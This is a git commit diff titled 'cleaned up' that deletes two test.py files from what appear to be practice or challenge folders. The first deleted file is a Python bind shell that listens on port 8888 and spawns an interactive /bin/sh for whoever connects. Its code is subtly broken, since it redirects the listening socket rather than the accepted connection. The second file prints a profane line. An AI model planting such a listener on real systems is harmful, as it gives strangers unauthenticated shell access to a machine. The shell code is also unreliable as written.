7a08f8d2aead32382b6a07dd438a8a44c87dfc07
raw <raw@localhost.localdomain>
2017-10-04 23:28:50 -0400

    cleaned up

--- rookis/brain_fuck/test.py
+++
@@ -1,9 +0,0 @@
-import subprocess, socket, os;
-s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
-s.bind(('', 8888))
-s.listen(1)
-conn,addr = s.accept()
-os.dup2(s.fileno(), 0), os.dup2(s.fileno(), 1), os.dup2(s.fileno(), 2);
-p = subprocess.call(["/bin/sh", "-i"]);
-
-
--- rookis/crypto1/test.py
+++
@@ -1,7 +0,0 @@
-import sys
-
-
-if __name__ == "__main__":
-    sys.stdout.write("hey motherfucker!\n")
-
-
